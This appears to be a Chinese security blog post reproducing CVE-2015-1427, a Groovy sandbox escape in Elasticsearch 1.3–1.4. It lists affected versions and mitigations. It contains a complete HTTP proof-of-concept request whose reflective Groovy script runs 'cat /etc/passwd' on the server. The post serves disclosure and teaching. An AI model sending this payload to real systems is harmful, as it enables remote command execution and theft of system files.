> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/gaLFPkLpeIy1SC3dmBY9VA)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa24an9TvS6grA3sWoTRYSQr4oCwuZgRaUPIJV1AesaAsTmry4zs6pvkE64q5U77Dz3TdpLFhEcdcRA/640?wx_fmt=jpeg)

**（ElasticSearch Groovy 远程代码执行漏洞   CVE-2015-1427）**

**前言：**  

Elasticsearch 是一个基于 Lucene 的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于 RESTful web 接口。Elasticsearch 是用 Java 语言开发的，并作为 Apache 许可条款下的开放源码发布，是一种流行的企业级搜索引擎。

**漏洞描述：**  

曾经被曝出过一个 ElasticSearch 远程代码执行漏洞（CVE-2014-3120） ，漏洞出现在脚本查询模块，由于搜索引擎支持使用脚本代码（MVEL），作为表达式进行数据操作，攻击者可以通过 MVEL 构造执行任意 java 代码。

后来脚本语言引擎换成了 Groovy，并且加入了沙盒进行控制，危险的代码会被拦截，结果这次由于沙盒限制的不严格，导致远程代码执行，

**漏洞复现:**

POC:

```
POST /_search?pretty HTTP/1.1
Host: ip:9200
User-Agent: python-requests/2.21.0
Accept: */*
Connection: close
Content-Length: 409

{"size":1,"script_fields": {"gem#": {"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getInputStream())).readLines()","lang": "groovy"}}}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24an9TvS6grA3sWoTRYSQr4xX3Y0sJKkbdHNuMnKGkBSKl2Gas71HOmJaLB3UsnsCb5UzLIPvhXuQ/640?wx_fmt=png)

**受影响版本：**  

<table><tbody><tr><td width="268" valign="top">Elasticsearch Elasticsearch</td><td width="268" valign="top">1.4.1</td></tr><tr><td width="268" valign="top">Elasticsearch Elasticsearch</td><td width="268" valign="top">1.4.2</td></tr><tr><td width="268" valign="top">Elasticsearch Elasticsearch</td><td width="268" valign="top">1.4.0&nbsp;&nbsp;</td></tr><tr><td width="268" valign="top">Elasticsearch Elasticsearch</td><td width="268" valign="top">1.4.0:Beta1&nbsp;&nbsp;</td></tr><tr><td width="268" valign="top">Elasticsearch Elasticsearch</td><td width="268" valign="top">1.3.7<br></td></tr></tbody></table>

**修复建议：**

关闭外网 关闭 groovy script；

在 elasticsearch.yml 进行配置加 script.groovy.sandbox.enabled: false 配置完需要重启 es 服务；

更新最新版本。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa260lZABWwEo49lodRtpGIOoYYt5Ojm4Y1sdMD4ez7rL55g1IW3icCTOia91YicOrh1sjuOB5TiaUibCiaiaA/640?wx_fmt=jpeg)

一起学习，请关注我![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24an9TvS6grA3sWoTRYSQr4hZQYrCwcz8gD1evatvHgAquT3YhfNMxgqib63eQ1mRnQVjQA6W9icxFg/640?wx_fmt=png)

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。